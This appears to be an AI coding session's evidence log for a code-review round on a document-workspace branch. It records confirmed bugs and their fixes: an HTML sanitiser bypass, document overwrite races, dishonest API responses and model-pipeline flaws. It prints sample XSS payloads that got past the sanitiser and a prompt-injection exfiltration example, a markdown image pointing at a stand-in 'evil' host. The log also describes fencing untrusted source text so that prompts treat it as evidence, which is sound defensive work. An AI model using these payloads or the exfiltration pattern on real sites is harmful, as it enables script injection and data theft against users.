# Evidence — the cold-review round on the workspace, and what it cost (2026-08-05)

Branch `feat/workspace-tables` · lane multiview · port 3003. Three `atlas-reviewer` agents were
run in parallel over `git diff main...HEAD` (96 files, ~14k lines) with disjoint scopes: the React
surface, the API/db/schema half, and the model pipeline. Founder asked for the review directly.

Every finding below was re-verified by this session before it was fixed — by reading the code path
end to end, or by executing it. Two were rejected on inspection (see the last section).

---

## 1. The sanitiser bypass — CONFIRMED BY EXECUTION, then closed

`sanitizeFragment` (`src/lib/workspace/chat/compose.ts`) matched tags with
`<\/?([a-zA-Z][a-zA-Z0-9]*)\b[^>]*>`. Against `<p_ onclick="…">` the name group matches `p`, and
`\b` cannot assert a boundary between `p` and `_` — both are word characters — so the run matched
NOTHING and passed through untouched, attributes included. The final guard `<(?![/a-zA-Z])`
then declined to escape it, because `<` *is* followed by a letter.

Run against the real exported function before the fix:

```
"<p_ onclick=\"alert(1)\">click</p_>"      => "<p_ onclick=\"alert(1)\">click</p_>"
"<x_ onmouseover=\"fetch(1)\">hover</x_>"  => "<x_ onmouseover=\"fetch(1)\">hover</x_>"
"<img_ src=x onerror=\"alert(1)\">"        => "<img_ src=x onerror=\"alert(1)\">"
```

`<p_>` is not inert: the HTML parser accepts `_` in a tag name and builds an `HTMLUnknownElement`,
which inherits `GlobalEventHandlers`. The fragment reaches `docInsert.insertIntoBody`, which does
`holder.innerHTML = fragment`, and `grep -rn "Content-Security-Policy" next.config.js src/middleware.ts`
returns nothing. So the handler was live. Session-scoped only because the document is not yet
persisted — which is the next slice, i.e. the window was closing.

**The second half of the defect was a COMMENT.** `compose.ts:60` justified adding the whole
`<table>` family to the allow-list on the grounds that "the sanitiser strips EVERY attribute
regardless of the tag". That claim was false when it was written. It has been replaced with a
pointer to the tests rather than a restatement.

**Fix:** a tag name now runs to the first space, slash or `>`; approved tags are swapped for
placeholders, EVERY remaining `<` is escaped, and the placeholders are restored. After the fix,
the same three inputs return `"click"`, `"hover"`, `""`.

**Proof kept as a test, not a habit** (`compose.test.ts`): per-input assertions, a
model-cannot-forge-the-placeholders test, and one that states the whole invariant — *after
sanitising, every angle-bracketed run left is exactly `<name>` or `</name>` for a name on the
list* — swept over 11 attack strings including `<sc<!--x-->ript>`, `<svg><script>`, `<math>`,
attribute values containing `>`, and `<template>`.

## 2. The document could be destroyed, or silently not written — CONFIRMED, then closed

Both directions of one mistake: `putInDocument` decided "is the document pane on screen" from a
`useCallback` closure, i.e. from the layout as it stood when the analyst pressed connect —
seconds earlier, before a model call.

- Captured **open**, closed by the time it landed → the fragment was queued for a pane that no
  longer existed. `WorkingDocument`'s insert effect is declared BEFORE its seed effect, and
  effects run in declaration order, so at the pane's next mount the splice landed in an EMPTY
  body and persisted that as the whole document. **The analyst's document was replaced by the new
  paragraph** — reached through the pill's own "Open" button.
- Captured **closed**, open by the time it landed → spliced into the stored HTML, which the
  mounted pane refuses to re-seed over; the next keystroke persisted the DOM back over the store
  and took the paragraph with it.

Both said "Added to your document".

**Fixes:** live refs for the pane state and the stored HTML, read at insert time; `insertFragment`
seeds from the store before splicing, so the guarantee belongs to the function that must never
write into a body it has not filled; the single insert slot became a queue with a high-water mark
(two passages can be in flight, and the later one used to overwrite the earlier); an in-flight
counter, so "added" is a claim about all the jobs rather than the first to finish.

**Verified in the browser, real drags and clicks**, `localhost:3003`, tab 178468166:
typed `MY OWN OPENING PARAGRAPH THAT MUST SURVIVE` into the document → switched to the Q3 2025
transcript → marked a passage → connect → *while it composed*, marked a second passage and
connected that too → returned to the document. **All three present**, both composed paragraphs
carrying their `(תיגבור — Q3 2025)` source line. Console clean.

## 3. Found in the browser, by the screenshot that was proving something else

The placeholder — *"Write here — or tell Atlas what to draft"* — was painted straight through the
analyst's own first paragraph after any tab switch. `empty` starts true and was only ever cleared
by typing or by an insert; the seed effect set `innerHTML` without touching it. Pre-existing, and
newly visible because content now survives a tab switch. Fixed in the seed effect.

## 4. Honesty defects on the server — CONFIRMED by reading, then closed

| Was | Now |
|---|---|
| `deleteWorkspace`/`deleteItem`/`deleteBlock` had no `.select()`, so a delete that matched no row returned `error: null` and the route answered `{deleted:true}` — Atlas reporting a workspace destroyed it never touched | the delete returns its rows; zero rows throws `RowNotFound` → **404** |
| `patchWorkspace`/`patchItem`/`patchBlock`/`patchThread` ended in `.single()`, whose PGRST116 became a **500** carrying the raw string *"JSON object requested, multiple (or no) rows returned"* — rendered in English inside a Hebrew RTL banner | `.maybeSingle()` → `RowNotFound` → **404** |
| `patchItem`/`deleteItem`/`patchBlock`/`deleteBlock`/`patchThread` ignored the workspace id in their own URL, so `/workspaces/A/items/<item in B>` mutated B and stamped A as recently edited | every child write binds `.eq('workspace_id', …)`, copying `lib/workspace/content.ts` |

No security hole in any of it — RLS holds throughout, every query runs on the user's client, and
`supabaseAdmin` appears nowhere in the workspace code. Neither delete has a UI caller yet, so no
caller's error path changed.

## 5. Model pipeline — closed

- **A clipping that failed validation became a compose without one**, while the client still
  wrapped the answer in the clipping's source line: an invented table attributed to a real
  filing. The route now **refuses** (400) rather than answering blind.
- **The hedge fired on every single call.** `HEDGE_MS` was 1200ms — shorter than any grounded
  completion this pipeline makes — and nothing aborted the loser, so every question, compose and
  intake search was billed twice, in full, at both vendors. The header comment claimed it "costs
  nothing on a healthy turn"; that never happened once. Now 6s, and the loser is aborted.
- **`result.partial` was discarded** by the document surface while the chat rendered the identical
  signal — a draft written from the first slice of a transcript went in with no caveat.
- **Markdown images are no longer rendered.** An injected source emitting `![](https://evil/?d=…)`
  is a GET the browser makes by itself, with no click and no CSP to stop it.
- **Source text is fenced** with a marker the prompts name, occurrences inside the text are
  defanged, and both prompts now state that material between markers is evidence and never an
  instruction. This does not make injection impossible; it makes the boundary legible.
- `firstJsonObject` committed to the first `{`, so `Here's the object {as asked}: {"reply":…}`
  failed closed to "could not answer" — a silent downgrade to keyword search. It now steps over
  candidates that do not parse (`json.test.ts`, new).
- `<p> </p>` counted as a usable draft, so an empty paragraph was inserted and flashed as "added".
- `clipFigureHtml` interpolated `dataUrl` unescaped — the one of four interpolations that was not.

## 6. Smaller, same round

Pill collided with the docked player (`bottom-6 z-40`, painted under it) — raised when a call is
loaded · `<audio>` had no `onError`, so a 404 recording left `pendingPlayRef` true forever and
"Play the recording" did nothing, silently, forever — now cleared, and the bar says
*"This recording could not be loaded"* / *"לא ניתן לטעון את ההקלטה הזאת"* · closing the
add-a-document dialog left `addRequest` set, so the next manual open re-sent the previous chat's
sentence · the empty-clip failure used `setDocDone` directly and never auto-dismissed · a PDF
pane's toolbar had no scroll container and pushed its own ✕ out of the pane at 3–4 panes ·
`closeTab` called `setActiveTab` inside a `setOpenTabs` updater, the one place still breaking this
file's own rule.

## 7. Reported and NOT acted on, with the reason

- **A fourth anchor hole in migration 016** — `workspace_doc_blocks_one_anchor` forbids page+line
  together but not a `source_page` on a block citing a *transcript*. Real, and the same class 017
  closed one table up. **Deferred deliberately:** it needs DDL against the shared production
  database, and `.claude/rules/db.md` requires the migration file to be reviewed BEFORE it is
  applied. Nothing writes blocks yet. It belongs to the slice that starts writing them.
- **`storage_path` has no length bound and no FK** — true; it is unresolved by any reader today
  (`content.ts:69`), so the first consumer inherits it. Filed for the same slice.
- **Chat history budget** (`MAX_TURNS` 24 × 4000 chars riding on top of the 40k context budget) —
  a real overshoot of the 30k-TPM ceiling the budget was cut to respect, but fixing it properly
  means measuring the whole prompt rather than capping two halves independently. Not a one-line
  change; not smuggled into a fix round.
- **`docs/MAYA-API.md` is a stowaway on this branch** — accepted. It documents a live finding the
  founder asked for on 2026-08-05 and belongs on main; moving it now would cost more than it saves.

## Gates

`npm test` → **410 pass / 0 fail** (405 before this round; +5 new: 3 sanitiser, 2 JSON reader —
`json.test.ts` registered in `package.json`, which `testRegistry.test.ts` enforces).
`npx tsc --noEmit` → clean. Console → no errors or exceptions.
Browser: English and Hebrew, four-pane split, real drags and real clicks. `npm run build` NOT run
— a dev server owns `.next` in this checkout.
